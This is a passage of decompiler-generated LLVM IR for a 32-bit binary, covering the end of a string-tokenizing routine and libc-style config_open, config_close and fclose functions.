  %v3_804bb8c = add i32 %v0_804bb8b, 8
  %v0_804bb8d = load i32, i32* @ebx, align 4
  %v2_804bb8d = add i32 %v0_804bb8d, %v0_804bb86
  store i32 %v2_804bb8d, i32* @ebx, align 4
  br label %dec_label_pc_804bbbe

dec_label_pc_804bb91:                             ; preds = %dec_label_pc_804bb6f
  %v1_804bb91 = add i32 %v1_804bb69, 56
  %v2_804bb91 = inttoptr i32 %v1_804bb91 to i32*
  %v3_804bb91 = load i32, i32* %v2_804bb91, align 4
  %v1_804bb95 = inttoptr i32 %v3_804bb91 to i8*
  %v2_804bb95 = load i8, i8* %v1_804bb95, align 1
  %v3_804bb95 = zext i8 %v2_804bb95 to i32
  store i32 %v3_804bb95, i32* %eax.global-to-local, align 4
  %v2_804bb98 = add i32 %v1_804bb69, -4
  %v3_804bb98 = inttoptr i32 %v2_804bb98 to i32*
  store i32 %v3_804bb95, i32* %v3_804bb98, align 4
  %v0_804bb99 = load i32, i32* @ebx, align 4
  %v2_804bb99 = add i32 %v1_804bb69, -8
  %v3_804bb99 = inttoptr i32 %v2_804bb99 to i32*
  store i32 %v0_804bb99, i32* %v3_804bb99, align 4
  %v0_804bb9a = call i32 @__GI_strchrnul()
  store i32 %v0_804bb9a, i32* %eax.global-to-local, align 4
  %v0_804bb9f = load i32, i32* @esp, align 4
  %v1_804bb9f = inttoptr i32 %v0_804bb9f to i32*
  %v2_804bb9f = load i32, i32* %v1_804bb9f, align 4
  store i32 %v2_804bb9f, i32* %ebx.global-to-local, align 4
  %v3_804bba0 = add i32 %v0_804bb9f, 8
  store i32 %v0_804bb9a, i32* @ebx, align 4
  %v1_804bba3 = add i32 %v0_804bb9f, 20
  %v2_804bba3 = inttoptr i32 %v1_804bba3 to i32*
  %v3_804bba3 = load i32, i32* %v2_804bba3, align 4
  %v4_804bba3 = icmp eq i32 %v3_804bba3, 0
  %v1_804bba8 = icmp eq i1 %v4_804bba3, false
  br i1 %v1_804bba8, label %dec_label_pc_804bbad, label %dec_label_pc_804bbbe

dec_label_pc_804bbac:                             ; preds = %dec_label_pc_804bbad
  %v1_804bbac = add i32 %v0_804bbac, -1
  store i32 %v1_804bbac, i32* @ebx, align 4
  br label %dec_label_pc_804bbad

dec_label_pc_804bbad:                             ; preds = %dec_label_pc_804bb91, %dec_label_pc_804bbac
  %v1_804bbb1 = phi i32 [ %v3_804bbb9, %dec_label_pc_804bbac ], [ %v3_804bba0, %dec_label_pc_804bb91 ]
  %v0_804bbad = phi i32 [ %v1_804bbac, %dec_label_pc_804bbac ], [ %v0_804bb9a, %dec_label_pc_804bb91 ]
  %v1_804bbad = add i32 %v0_804bbad, -1
  %v2_804bbad = inttoptr i32 %v1_804bbad to i8*
  %v3_804bbad = load i8, i8* %v2_804bbad, align 1
  %v4_804bbad = zext i8 %v3_804bbad to i32
  store i32 %v4_804bbad, i32* %eax.global-to-local, align 4
  %v2_804bbb1 = add i32 %v1_804bbb1, -4
  %v3_804bbb1 = inttoptr i32 %v2_804bbb1 to i32*
  store i32 %v4_804bbad, i32* %v3_804bbb1, align 4
  %v0_804bbb2 = load i32, i32* @edi, align 4
  %v2_804bbb2 = add i32 %v1_804bbb1, -8
  %v3_804bbb2 = inttoptr i32 %v2_804bbb2 to i32*
  store i32 %v0_804bbb2, i32* %v3_804bbb2, align 4
  %v0_804bbb3 = load i8*, i8** %stack_var_-40, align 4
  %v4_804bbb3 = call i32 @__GI_strchr(i8* %v0_804bbb3, i32 %v2_804b9e3)
  store i32 %v4_804bbb3, i32* %eax.global-to-local, align 4
  %v0_804bbb8 = load i32, i32* @esp, align 4
  %v3_804bbb8 = add i32 %v0_804bbb8, 4
  %v1_804bbb9 = inttoptr i32 %v3_804bbb8 to i32*
  %v2_804bbb9 = load i32, i32* %v1_804bbb9, align 4
  store i32 %v2_804bbb9, i32* @ecx, align 4
  %v3_804bbb9 = add i32 %v0_804bbb8, 8
  %v1_804bbba = icmp eq i32 %v4_804bbb3, 0
  %v1_804bbbc = icmp eq i1 %v1_804bbba, false
  %v0_804bbac = load i32, i32* @ebx, align 4
  br i1 %v1_804bbbc, label %dec_label_pc_804bbac, label %dec_label_pc_804bbbe

dec_label_pc_804bbbe:                             ; preds = %dec_label_pc_804bbad, %dec_label_pc_804bb91, %dec_label_pc_804bb84
  %v0_804bbc0 = phi i32 [ %v3_804bba0, %dec_label_pc_804bb91 ], [ %v3_804bb8c, %dec_label_pc_804bb84 ], [ %v3_804bbb9, %dec_label_pc_804bbad ]
  %v0_804bbd1 = phi i32 [ %v0_804bb9a, %dec_label_pc_804bb91 ], [ %v2_804bb8d, %dec_label_pc_804bb84 ], [ %v0_804bbac, %dec_label_pc_804bbad ]
  %v4_804bbbe = phi i32 [ %v0_804bb9a, %dec_label_pc_804bb91 ], [ %v0_804bb86, %dec_label_pc_804bb84 ], [ %v4_804bbb3, %dec_label_pc_804bbad ]
  %v1_804bbbe = inttoptr i32 %v0_804bbd1 to i8*
  %v2_804bbbe = load i8, i8* %v1_804bbbe, align 1
  %v3_804bbbe = zext i8 %v2_804bbbe to i32
  %v5_804bbbe = and i32 %v4_804bbbe, -256
  %v6_804bbbe = or i32 %v3_804bbbe, %v5_804bbbe
  store i32 %v6_804bbbe, i32* %eax.global-to-local, align 4
  %v1_804bbc0 = add i32 %v0_804bbc0, 56
  %v2_804bbc0 = inttoptr i32 %v1_804bbc0 to i32*
  %v3_804bbc0 = load i32, i32* %v2_804bbc0, align 4
  store i32 %v3_804bbc0, i32* @edx, align 4
  %v3_804bbc4 = inttoptr i32 %v3_804bbc0 to i8*
  %v4_804bbc4 = load i8, i8* %v3_804bbc4, align 1
  %v15_804bbc4 = icmp eq i8 %v2_804bbbe, %v4_804bbc4
  %v1_804bbc6 = icmp eq i1 %v15_804bbc4, false
  br i1 %v1_804bbc6, label %dec_label_pc_804bbcd, label %dec_label_pc_804bbc8

dec_label_pc_804bbc8:                             ; preds = %dec_label_pc_804bbbe
  store i8 0, i8* %v1_804bbbe, align 1
  br label %dec_label_pc_804bbd5

dec_label_pc_804bbcd:                             ; preds = %dec_label_pc_804bbbe
  %v4_804bbcd = icmp eq i8 %v2_804bbbe, 0
  br i1 %v4_804bbcd, label %dec_label_pc_804bbd5, label %dec_label_pc_804bbd1

dec_label_pc_804bbd1:                             ; preds = %dec_label_pc_804bbcd
  store i8 0, i8* %v1_804bbbe, align 1
  %v0_804bbd4 = load i32, i32* @ebx, align 4
  %v1_804bbd4 = add i32 %v0_804bbd4, 1
  store i32 %v1_804bbd4, i32* @ebx, align 4
  br label %dec_label_pc_804bbd5

dec_label_pc_804bbd5:                             ; preds = %dec_label_pc_804bbcd, %dec_label_pc_804bbc8, %dec_label_pc_804bbd1
  %v0_804bbd5 = load i32, i32* @esp, align 4
  %v1_804bbd5 = add i32 %v0_804bbd5, 52
  %v2_804bbd5 = inttoptr i32 %v1_804bbd5 to i32*
  %v3_804bbd5 = load i32, i32* %v2_804bbd5, align 4
  %v4_804bbd5 = and i32 %v3_804bbd5, 65536
  %v5_804bbd5 = icmp eq i32 %v4_804bbd5, 0
  br i1 %v5_804bbd5, label %dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge, label %dec_label_pc_804bbdf

dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge: ; preds = %dec_label_pc_804bbd5
  %v0_804bbeb.pre = load i32, i32* @ebx, align 4
  %v4_804bbeb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bbea

dec_label_pc_804bbdf:                             ; preds = %dec_label_pc_804bbd5
  %v0_804bbdf = load i32, i32* @edi, align 4
  %v2_804bbdf = add i32 %v0_804bbd5, -4
  %v3_804bbdf = inttoptr i32 %v2_804bbdf to i32*
  store i32 %v0_804bbdf, i32* %v3_804bbdf, align 4
  %v0_804bbe0 = load i32, i32* @ebx, align 4
  %v2_804bbe0 = add i32 %v0_804bbd5, -8
  %v3_804bbe0 = inttoptr i32 %v2_804bbe0 to i32*
  store i32 %v0_804bbe0, i32* %v3_804bbe0, align 4
  %v0_804bbe1 = load i8*, i8** %stack_var_-40, align 4
  %v4_804bbe1 = call i32 @__GI_strspn(i8* %v0_804bbe1, i32 %v2_804b9e3)
  store i32 %v4_804bbe1, i32* %eax.global-to-local, align 4
  %v0_804bbe6 = load i32, i32* @esp, align 4
  %v1_804bbe6 = inttoptr i32 %v0_804bbe6 to i32*
  %v2_804bbe6 = load i32, i32* %v1_804bbe6, align 4
  store i32 %v2_804bbe6, i32* @edx, align 4
  %v3_804bbe6 = add i32 %v0_804bbe6, 4
  %v1_804bbe7 = inttoptr i32 %v3_804bbe6 to i32*
  %v2_804bbe7 = load i32, i32* %v1_804bbe7, align 4
  store i32 %v2_804bbe7, i32* @ecx, align 4
  %v3_804bbe7 = add i32 %v0_804bbe6, 8
  %v0_804bbe8 = load i32, i32* @ebx, align 4
  %v2_804bbe8 = add i32 %v0_804bbe8, %v4_804bbe1
  store i32 %v2_804bbe8, i32* @ebx, align 4
  br label %dec_label_pc_804bbea

dec_label_pc_804bbea:                             ; preds = %dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge, %dec_label_pc_804bbdf
  %v1_804bc03.pre = phi i32 [ %v0_804bbd5, %dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge ], [ %v3_804bbe7, %dec_label_pc_804bbdf ]
  %v4_804bbeb = phi i32 [ %v4_804bbeb.pre, %dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge ], [ %v4_804bbe1, %dec_label_pc_804bbdf ]
  %v0_804bbeb = phi i32 [ %v0_804bbeb.pre, %dec_label_pc_804bbd5.dec_label_pc_804bbea_crit_edge ], [ %v2_804bbe8, %dec_label_pc_804bbdf ]
  %v0_804bbea = load i32, i32* @ebp, align 4
  %v1_804bbea = add i32 %v0_804bbea, 1
  store i32 %v1_804bbea, i32* @ebp, align 4
  %v1_804bbeb = inttoptr i32 %v0_804bbeb to i8*
  %v2_804bbeb = load i8, i8* %v1_804bbeb, align 1
  %v3_804bbeb = zext i8 %v2_804bbeb to i32
  %v5_804bbeb = and i32 %v4_804bbeb, -256
  %v6_804bbeb = or i32 %v5_804bbeb, %v3_804bbeb
  store i32 %v6_804bbeb, i32* %eax.global-to-local, align 4
  %v4_804bbed = icmp eq i8 %v2_804bbeb, 0
  br i1 %v4_804bbed, label %dec_label_pc_804bc03, label %dec_label_pc_804bbf1

dec_label_pc_804bbf1:                             ; preds = %dec_label_pc_804bb4d, %dec_label_pc_804bbea
  %v1_804bc03.pre48 = phi i32 [ %v1_804bc03.pre, %dec_label_pc_804bbea ], [ %v1_804bc03.pre45, %dec_label_pc_804bb4d ]
  %v2_804bbeb47 = phi i8 [ %v2_804bbeb, %dec_label_pc_804bbea ], [ %v2_804bbeb39, %dec_label_pc_804bb4d ]
  %v0_804bbeb46 = phi i32 [ %v0_804bbeb, %dec_label_pc_804bbea ], [ %v0_804bbeb37, %dec_label_pc_804bb4d ]
  %v1_804bbf1 = add i32 %v1_804bc03.pre48, 56
  %v2_804bbf1 = inttoptr i32 %v1_804bbf1 to i32*
  %v3_804bbf1 = load i32, i32* %v2_804bbf1, align 4
  store i32 %v3_804bbf1, i32* @edx, align 4
  %v3_804bbf5 = inttoptr i32 %v3_804bbf1 to i8*
  %v4_804bbf5 = load i8, i8* %v3_804bbf5, align 1
  %v15_804bbf5 = icmp eq i8 %v2_804bbeb47, %v4_804bbf5
  br i1 %v15_804bbf5, label %dec_label_pc_804bc03, label %dec_label_pc_804bbf9

dec_label_pc_804bbf9:                             ; preds = %dec_label_pc_804bbf1
  %v0_804bbf9 = load i32, i32* @ebp, align 4
  %v2_804bbf9 = add i32 %v1_804bc03.pre48, 16
  %v3_804bbf9 = inttoptr i32 %v2_804bbf9 to i32*
  %v4_804bbf9 = load i32, i32* %v3_804bbf9, align 4
  %v5_804bbf9 = sub i32 %v0_804bbf9, %v4_804bbf9
  %v11_804bbf9 = xor i32 %v4_804bbf9, %v0_804bbf9
  %v12_804bbf9 = xor i32 %v5_804bbf9, %v0_804bbf9
  %v13_804bbf9 = and i32 %v12_804bbf9, %v11_804bbf9
  %v14_804bbf9 = icmp slt i32 %v13_804bbf9, 0
  %v16_804bbf9 = icmp slt i32 %v5_804bbf9, 0
  %v2_804bbfd = icmp eq i1 %v16_804bbf9, %v14_804bbf9
  br i1 %v2_804bbfd, label %dec_label_pc_804bc03, label %dec_label_pc_804bb60

dec_label_pc_804bc03:                             ; preds = %dec_label_pc_804bbf1, %dec_label_pc_804bbf9, %dec_label_pc_804bbea, %dec_label_pc_804bb4d
  %v1_804bc03.pre.lcssa = phi i32 [ %v1_804bc03.pre45, %dec_label_pc_804bb4d ], [ %v1_804bc03.pre, %dec_label_pc_804bbea ], [ %v1_804bc03.pre48, %dec_label_pc_804bbf9 ], [ %v1_804bc03.pre48, %dec_label_pc_804bbf1 ]
  %v0_804bc03 = load i32, i32* @ebp, align 4
  %v2_804bc03 = add i32 %v1_804bc03.pre.lcssa, 20
  %v3_804bc03 = inttoptr i32 %v2_804bc03 to i32*
  %v4_804bc03 = load i32, i32* %v3_804bc03, align 4
  %v5_804bc03 = sub i32 %v0_804bc03, %v4_804bc03
  %v11_804bc03 = xor i32 %v4_804bc03, %v0_804bc03
  %v12_804bc03 = xor i32 %v5_804bc03, %v0_804bc03
  %v13_804bc03 = and i32 %v12_804bc03, %v11_804bc03
  %v14_804bc03 = icmp slt i32 %v13_804bc03, 0
  %v16_804bc03 = icmp slt i32 %v5_804bc03, 0
  %v2_804bc07 = icmp eq i1 %v16_804bc03, %v14_804bc03
  br i1 %v2_804bc07, label %dec_label_pc_804bc19, label %dec_label_pc_804bc09

dec_label_pc_804bc09:                             ; preds = %dec_label_pc_804bc03
  %v1_804bc09 = add i32 %v1_804bc03.pre.lcssa, 52
  %v2_804bc09 = inttoptr i32 %v1_804bc09 to i32*
  %v3_804bc09 = load i32, i32* %v2_804bc09, align 4
  %v4_804bc09 = and i32 %v3_804bc09, 1048576
  %v5_804bc09 = icmp eq i32 %v4_804bc09, 0
  br i1 %v5_804bc09, label %dec_label_pc_804b9ee, label %dec_label_pc_804bc17

dec_label_pc_804bc17:                             ; preds = %dec_label_pc_804bc09, %dec_label_pc_804ba0d, %dec_label_pc_804baf6.dec_label_pc_804bc17.loopexit_crit_edge, %entry
  %v0_804bc1b.pre = phi i32 [ %v15_804b9c0, %entry ], [ %v0_804bc1b.pre.pre.pre, %dec_label_pc_804baf6.dec_label_pc_804bc17.loopexit_crit_edge ], [ %v1_804bc03.pre.lcssa, %dec_label_pc_804bc09 ], [ %v3_804ba1c, %dec_label_pc_804ba0d ]
  br label %dec_label_pc_804bc19

dec_label_pc_804bc19:                             ; preds = %dec_label_pc_804bc03, %dec_label_pc_804ba4e, %dec_label_pc_804bc17
  %v0_804bc1b = phi i32 [ %v1_804ba5d, %dec_label_pc_804ba4e ], [ %v0_804bc1b.pre, %dec_label_pc_804bc17 ], [ %v1_804bc03.pre.lcssa, %dec_label_pc_804bc03 ]
  %v0_804bc19 = phi i32 [ 0, %dec_label_pc_804ba4e ], [ 0, %dec_label_pc_804bc17 ], [ %v0_804bc03, %dec_label_pc_804bc03 ]
  store i32 %v0_804bc19, i32* %eax.global-to-local, align 4
  %v1_804bc1b = add i32 %v0_804bc1b, 24
  %v1_804bc1e = inttoptr i32 %v1_804bc1b to i32*
  %v2_804bc1e = load i32, i32* %v1_804bc1e, align 4
  store i32 %v2_804bc1e, i32* @ebx, align 4
  %v3_804bc1e = add i32 %v0_804bc1b, 28
  %v1_804bc1f = inttoptr i32 %v3_804bc1e to i32*
  %v2_804bc1f = load i32, i32* %v1_804bc1f, align 4
  store i32 %v2_804bc1f, i32* @esi, align 4
  %v3_804bc1f = add i32 %v0_804bc1b, 32
  %v1_804bc20 = inttoptr i32 %v3_804bc1f to i32*
  %v2_804bc20 = load i32, i32* %v1_804bc20, align 4
  store i32 %v2_804bc20, i32* @edi, align 4
  %v3_804bc20 = add i32 %v0_804bc1b, 36
  %v1_804bc21 = inttoptr i32 %v3_804bc20 to i32*
  %v2_804bc21 = load i32, i32* %v1_804bc21, align 4
  store i32 %v2_804bc21, i32* @ebp, align 4
  ret i32 %v0_804bc19

; uselistorder directives
  uselistorder i32 %v0_804bc19, { 1, 0 }
  uselistorder i32 %v0_804bc1b, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804bc03, { 1, 0 }
  uselistorder i32 %v5_804bbf9, { 1, 0 }
  uselistorder i32 %v0_804bbf9, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bc03.pre48, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804bbd5, { 0, 2, 1, 3 }
  uselistorder i8 %v2_804bbbe, { 1, 0, 2 }
  uselistorder i32 %v1_804bbb1, { 1, 0 }
  uselistorder i32 %v3_804bba0, { 1, 0 }
  uselistorder i32 %v0_804bb9a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804bb86, { 1, 0, 2 }
  uselistorder i32 %v1_804bb69, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32 %v4_804bb2e, { 1, 0, 2 }
  uselistorder i32 %v0_804bb27, { 1, 0, 2 }
  uselistorder i32 %v3_804baca, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804bac2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804ba8b, { 1, 0 }
  uselistorder i32 %v4_804ba7b, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804ba47, { 3, 2, 0, 1 }
  uselistorder i8* %v2_804ba95, { 2, 1, 0 }
  uselistorder i32* %v2_804ba36, { 4, 5, 3, 6, 1, 2, 0 }
  uselistorder i32* %v3_804ba2f, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %v2_804ba29, { 2, 3, 4, 1, 0 }
  uselistorder i32* %v2_804b9ee, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_804b9e3, { 3, 4, 5, 2, 1, 6, 0 }
  uselistorder i8** %stack_var_-40, { 8, 2, 7, 5, 10, 3, 6, 4, 9, 1, 0 }
  uselistorder i32 %tmp27, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 131072, { 1, 2, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder label %dec_label_pc_804bc19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bc17, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804bc03, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804bbf1, { 1, 0 }
  uselistorder label %dec_label_pc_804bbea, { 1, 0 }
  uselistorder label %dec_label_pc_804bbd5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bbad, { 1, 0 }
  uselistorder label %dec_label_pc_804bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804bb37, { 1, 0 }
  uselistorder label %dec_label_pc_804baf6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804baec, { 1, 0 }
  uselistorder label %dec_label_pc_804bae9, { 1, 0 }
  uselistorder label %dec_label_pc_804bac2, { 1, 0 }
  uselistorder label %dec_label_pc_804ba29, { 1, 0 }
  uselistorder label %dec_label_pc_804ba0d, { 1, 0 }
  uselistorder label %dec_label_pc_804ba01, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc23 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc23, i32* %stack_var_-4, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v1_804bc28 = icmp eq i32* %arg1, null
  br i1 %v1_804bc28, label %entry.dec_label_pc_804bc4d_crit_edge, label %dec_label_pc_804bc2c

entry.dec_label_pc_804bc4d_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804bc4d

dec_label_pc_804bc2c:                             ; preds = %entry
  %v2_804bc2c = load i32, i32* %arg1, align 4
  %v2_804bc2e = inttoptr i32 %v2_804bc2c to i16*
  %v3_804bc2e = call i32 @__GI_fclose(i16* %v2_804bc2e, i32 %v0_804bc23)
  %v1_804bc34 = add i32 %tmp2, 20
  %v2_804bc34 = inttoptr i32 %v1_804bc34 to i8*
  %v3_804bc34 = load i8, i8* %v2_804bc34, align 1
  %v4_804bc34 = icmp eq i8 %v3_804bc34, 0
  br i1 %v4_804bc34, label %dec_label_pc_804bc43, label %dec_label_pc_804bc3a

dec_label_pc_804bc3a:                             ; preds = %dec_label_pc_804bc2c
  %v1_804bc3a = add i32 %tmp2, 4
  %v2_804bc3a = inttoptr i32 %v1_804bc3a to i32*
  %v3_804bc3a = load i32, i32* %v2_804bc3a, align 4
  %v1_804bc3d = call i32 @free(i32 %v3_804bc3a)
  br label %dec_label_pc_804bc43

dec_label_pc_804bc43:                             ; preds = %dec_label_pc_804bc2c, %dec_label_pc_804bc3a
  %v2_804bc47 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc47, i32* @ebx, align 4
  %v1_804bc48 = call i32 @free(i32 %tmp2)
  br label %dec_label_pc_804bc4d

dec_label_pc_804bc4d:                             ; preds = %entry.dec_label_pc_804bc4d_crit_edge, %dec_label_pc_804bc43
  %v2_804bc4d = phi i32 [ %v0_804bc23, %entry.dec_label_pc_804bc4d_crit_edge ], [ %v2_804bc47, %dec_label_pc_804bc43 ]
  %.0 = phi i32 [ undef, %entry.dec_label_pc_804bc4d_crit_edge ], [ %v1_804bc48, %dec_label_pc_804bc43 ]
  store i32 %v2_804bc4d, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 3, 1, 0 }
  uselistorder i32* null, { 0, 1, 5, 2, 6, 7, 8, 9, 3, 4, 10 }
  uselistorder label %dec_label_pc_804bc4d, { 1, 0 }
  uselistorder label %dec_label_pc_804bc43, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc4f = load i32, i32* @ebx, align 4
  store i32 %v0_804bc4f, i32* %stack_var_-4, align 4
  %v2_804bc59 = call i32 @__GI_fopen(i32 %arg1, i32 ptrtoint (i32* @global_var_80512db.91 to i32))
  store i32 %v2_804bc59, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804bc64 = icmp eq i32 %v2_804bc59, 0
  br i1 %v1_804bc64, label %dec_label_pc_804bc79, label %dec_label_pc_804bc68

dec_label_pc_804bc68:                             ; preds = %entry
  %v3_804bc6c = call i32 @calloc(i64 1, i32 24)
  store i32 %v3_804bc6c, i32* %eax.global-to-local, align 4
  %v1_804bc73 = icmp eq i32 %v3_804bc6c, 0
  br i1 %v1_804bc73, label %dec_label_pc_804bc79, label %dec_label_pc_804bc77

dec_label_pc_804bc77:                             ; preds = %dec_label_pc_804bc68
  %v2_804bc77 = inttoptr i32 %v3_804bc6c to i32*
  store i32 %v2_804bc59, i32* %v2_804bc77, align 4
  %v0_804bc7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc79

dec_label_pc_804bc79:                             ; preds = %dec_label_pc_804bc68, %entry, %dec_label_pc_804bc77
  %v0_804bc7a = phi i32 [ 0, %dec_label_pc_804bc68 ], [ 0, %entry ], [ %v0_804bc7a.pre, %dec_label_pc_804bc77 ]
  %v2_804bc79 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc79, i32* @ebx, align 4
  ret i32 %v0_804bc7a

; uselistorder directives
  uselistorder i32 (i64, i32)* @calloc, { 1, 0 }
  uselistorder label %dec_label_pc_804bc79, { 2, 0, 1 }
}

define i32 @__GI_fclose(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_804bc7c = load i32, i32* @ebp, align 4
  %v0_804bc7d = load i32, i32* @edi, align 4
  %v0_804bc7e = load i32, i32* @esi, align 4
  %v0_804bc7f = load i32, i32* @ebx, align 4
  %v12_804bc80 = ptrtoint i32* %stack_var_-48 to i32
  %v4_804bc83 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804bc83, i32* @esi, align 4
  %v1_804bc87 = add i32 %v4_804bc83, 52
  %v2_804bc87 = inttoptr i32 %v1_804bc87 to i32*
  %v3_804bc87 = load i32, i32* %v2_804bc87, align 4
  %v4_804bc87 = icmp eq i32 %v3_804bc87, 0
  %v1_804bc8b = zext i1 %v4_804bc87 to i32
  store i32 %v1_804bc8b, i32* @ebp, align 4
  %v1_804bc91 = icmp eq i1 %v4_804bc87, false
  br i1 %v1_804bc91, label %dec_label_pc_804bcb1, label %dec_label_pc_804bc95

dec_label_pc_804bc95:                             ; preds = %entry
  %v1_804bc95 = add i32 %v4_804bc83, 56
  store i32 %v1_804bc95, i32* @ebx, align 4
  %v4_804bca3 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 %v1_804bc95)
  %v0_804bca8 = load i32, i32* @ebx, align 4
  %v1_804bca9 = call i32 @__pthread_return_0(i32 %v0_804bca8)
  %v0_804bcb3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bcb1

dec_label_pc_804bcb1:                             ; preds = %entry, %dec_label_pc_804bc95
  %v0_804bcb8 = phi i32 [ %v4_804bc83, %entry ], [ %v0_804bcb3.pre, %dec_label_pc_804bc95 ]
  store i32 0, i32* @edi, align 4
  %v1_804bcb3 = inttoptr i32 %v0_804bcb8 to i8*
  %v2_804bcb3 = load i8, i8* %v1_804bcb3, align 1
  %v3_804bcb3 = and i8 %v2_804bcb3, 64
  %v4_804bcb3 = icmp eq i8 %v3_804bcb3, 0
  br i1 %v4_804bcb3, label %dec_label_pc_804bcb1.dec_label_pc_804bcc1_crit_edge, label %dec_label_pc_804bcb8

dec_label_pc_804bcb1.dec_label_pc_804bcc1_crit_edge: ; preds = %dec_label_pc_804bcb1
  br label %dec_label_pc_804bcc1

dec_label_pc_804bcb8:                             ; preds = %dec_label_pc_804bcb1
  %v1_804bcb9 = inttoptr i32 %v0_804bcb8 to i16*
  %v2_804bcb9 = call i32 @fflush_unlocked(i16* %v1_804bcb9)
  store i32 %v2_804bcb9, i32* @edi, align 4
  %v0_804bcc1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bcc1

dec_label_pc_804bcc1:                             ; preds = %dec_label_pc_804bcb1.dec_label_pc_804bcc1_crit_edge, %dec_label_pc_804bcb8
  %v0_804bcc1 = phi i32 [ %v0_804bcb8, %dec_label_pc_804bcb1.dec_label_pc_804bcc1_crit_edge ], [ %v0_804bcc1.pre, %dec_label_pc_804bcb8 ]
  %v1_804bcc1 = add i32 %v0_804bcc1, 4
  %v2_804bcc1 = inttoptr i32 %v1_804bcc1 to i32*
  %v3_804bcc1 = load i32, i32* %v2_804bcc1, align 4
  %v1_804bcc4 = call i32 @__GI_close(i32 %v3_804bcc1)
  %v2_804bcca = icmp slt i32 %v1_804bcc4, 0
  %v1_804bccc = icmp eq i1 %v2_804bcca, false
  br i1 %v1_804bccc, label %dec_label_pc_804bcd1, label %dec_label_pc_804bcce

dec_label_pc_804bcce:                             ; preds = %dec_label_pc_804bcc1
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804bcd1

dec_label_pc_804bcd1:                             ; preds = %dec_label_pc_804bcc1, %dec_label_pc_804bcce
  %v0_804bcd1 = load i32, i32* @esi, align 4
  %v1_804bcd1 = add i32 %v0_804bcd1, 4
  %v2_804bcd1 = inttoptr i32 %v1_804bcd1 to i32*
  store i32 -1, i32* %v2_804bcd1, align 4
  store i32 %v12_804bc80, i32* @ebx, align 4
  %v4_804bce7 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134525440, i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v1_804bcf1 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v0_804bcf6 = load i32, i32* @global_var_80537c8.93, align 8
  %v1_804bcfb = add i32 %v0_804bcf6, 1
  store i32 %v1_804bcfb, i32* @global_var_80537c8.93, align 8
  %v3_804bd04 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_804bd09 = load i32, i32* @esi, align 4
  %v1_804bd09 = inttoptr i32 %v0_804bd09 to i32*
  %v2_804bd09 = load i32, i32* %v1_804bd09, align 4
  %v7_804bd0b = and i32 %v2_804bd09, 24576
  %v1_804bd0f = or i32 %v7_804bd0b, 48
  %v1_804bd12 = trunc i32 %v1_804bd0f to i16
  %v3_804bd12 = inttoptr i32 %v0_804bd09 to i16*
  store i16 %v1_804bd12, i16* %v3_804bd12, align 2
  br i1 %v1_804bc91, label %dec_label_pc_804bd2a, label %dec_label_pc_804bd1c

dec_label_pc_804bd1c:                             ; preds = %dec_label_pc_804bcd1
  %v3_804bd23 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_804bd2a

dec_label_pc_804bd2a:                             ; preds = %dec_label_pc_804bcd1, %dec_label_pc_804bd1c
  %v0_804bd2a = load i32, i32* @esi, align 4
  %v1_804bd2a = add i32 %v0_804bd2a, 1
